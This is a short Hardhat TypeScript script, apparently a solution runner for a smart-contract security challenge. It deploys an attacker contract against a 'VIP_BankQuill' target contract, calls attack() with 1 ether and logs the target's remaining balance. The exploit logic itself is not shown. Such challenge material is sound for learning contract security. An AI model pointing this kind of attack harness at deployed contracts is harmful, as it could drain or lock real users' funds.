import chalk from "chalk";
import { ethers } from "hardhat";
import { VIP_BankQuill__factory, VIP_BankQuill, VIP_BankQuillAttack__factory } from "../../typechain";
import { log, initialize } from "../utils";
import {randomBytes} from "crypto";

async function main() {
    let [vip_BankQuillContract, attacker] = await initialize<VIP_BankQuill>(VIP_BankQuill__factory);
    let vipAttack = await new VIP_BankQuillAttack__factory(attacker).deploy();
    await vipAttack.waitForDeployment();

    let tx = await vipAttack.attack(await vip_BankQuillContract.getAddress(), {value: ethers.parseEther("1")});
    await tx.wait();

    log(`Target balance: ${chalk.yellow(ethers.formatEther(await ethers.provider.getBalance(await vip_BankQuillContract.getAddress())))}`); 
    
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});